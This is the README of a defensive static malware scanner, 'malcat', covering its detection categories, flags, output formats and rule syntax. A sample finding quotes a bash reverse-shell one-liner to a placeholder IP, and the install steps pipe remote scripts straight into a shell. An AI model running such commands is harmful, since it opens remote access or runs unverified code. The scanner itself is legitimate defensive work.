# malcat

A fast, low-false-positive static analyzer for detecting malicious patterns in source code and compiled binaries. Built for scanning open-source projects you've cloned and want to trust before running.


## installation

# Linux / macOS
curl -fsSL https://raw.githubusercontent.com/master-sauce/malcat/main/install.sh | bash

# Windows
irm https://raw.githubusercontent.com/master-sauce/malcat/main/install.ps1 | iex


## Philosophy

Most scanners fire on every `exec()`, `eval()`, or backtick — generating hundreds of false positives in normal code. malcat takes the opposite approach: rules require **specific combinations** that are nearly impossible to explain as innocent code. A single `exec()` call never fires. A socket connection followed by a shell spawn does.

The focus is on:
- **C2 communication** — reverse shells, download cradles, beacon patterns
- **Persistence** — cron writes, registry Run keys, SSH backdoors, LD_PRELOAD
- **Evasion** — debugger detection, sandbox/VM checks, log wiping
- **Process injection** — Windows API triads, shellcode allocation
- **Credential theft** — LSASS dumps, hardcoded secrets, credential file access
- **Destructive payloads** — disk wipes, ransomware patterns, fork bombs
- **LOLBins** — certutil, regsvr32, rundll32, WMIC, mshta, bitsadmin abuse

## Installation

Requires Go 1.21 or later.

```bash
git clone https://github.com/your-username/malcat.git
cd malcat
go build -o malcat .
```

## Usage

```
malcat [flags] <file|directory> [<file|directory>...] [-o output]
```

### Flags

| Flag | Description |
|------|-------------|
| `-r`, `--recursive` | Scan directories recursively |
| `--severity` | Minimum severity to report: `low`, `medium`, `high`, `critical` (default: `low`) |
| `--depth` | Max recursion depth, `-1` = unlimited (default: `-1`) |
| `--ext` | Comma-separated file extensions to scan, e.g. `.py,.sh,.js`. Empty = all |
| `--bin`, `--binaries` | Scan compiled binaries using `strings` extraction |
| `-o`, `--output` | Write results to file. Format inferred from extension (`.json`, `.csv`, or plain text) |

### Examples

```bash
# Scan a single file
malcat suspicious.sh

# Recursively scan a cloned repo
malcat -r ./cloned-repo

# Only show high and critical findings
malcat -r --severity high ./cloned-repo

# Scan only Python and shell files
malcat -r --ext .py,.sh ./cloned-repo

# Scan a compiled binary
malcat --bin ./suspicious.exe

# Save results as JSON
malcat -r ./cloned-repo -o report.json

# Save results as CSV
malcat -r ./cloned-repo -o results.csv

# Scan a directory including binaries, save JSON
malcat -r --bin ./cloned-repo -o report.json
```

## Output

Each finding shows the severity, rule name, line number, category, and a trimmed content window centred on the exact matched text (highlighted in color):

```
╔══ ./cloned-repo/install.sh ══
 CRITICAL  Bash reverse shell  L42
  C2/Backdoor  ·  NET001
  Classic reverse shell redirecting bash stdio to a TCP socket
  › bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
╚═════════════════════════════════════════════════════════════════════
```

### Severity levels

| Level | Color | Meaning |
|-------|-------|---------|
| `CRITICAL` | Magenta | Definitive malicious pattern, almost no legitimate use |
| `HIGH` | Red | Strong indicator of malicious intent |
| `MEDIUM` | Yellow | Suspicious, warrants investigation |
| `LOW` | Cyan | Informational |

### Output formats

- **Text** (default) — colorized terminal output
- **JSON** — `malcat -r ./repo -o report.json`
- **CSV** — `malcat -r ./repo -o report.csv`

## Rule sets

### Source code rules (`rules.go`)

### Binary rules (`binary_rules.go`, activated with `--bin`)

Binary mode runs `strings` on the executable and applies a tighter rule set designed for extracted strings, which lack code context.

## Adding rules

Rules are defined in `rules.go` (source) and `binary_rules.go` (binaries). Each rule follows this signature:

```go
newRule("ID", "Name", "Category", Severity, "Details", "RegexPattern", "keyword1", "keyword2")
```

Keywords are optional pre-filters — the regex only runs on lines that contain at least one keyword (case-insensitive). This keeps scanning fast on large codebases. If you omit keywords, every line is tested against the regex.

Rebuild after changes:

```bash
go build -o malcat .
```

## Limitations

- Static analysis only — cannot detect purely runtime behaviour
- Binary scanning depends on the `strings` utility being available on your PATH (standard on Linux/macOS; on Windows, install via Git for Windows or WSL)
- Obfuscated or packed binaries may evade detection entirely
- Results should be treated as leads to investigate, not definitive verdicts

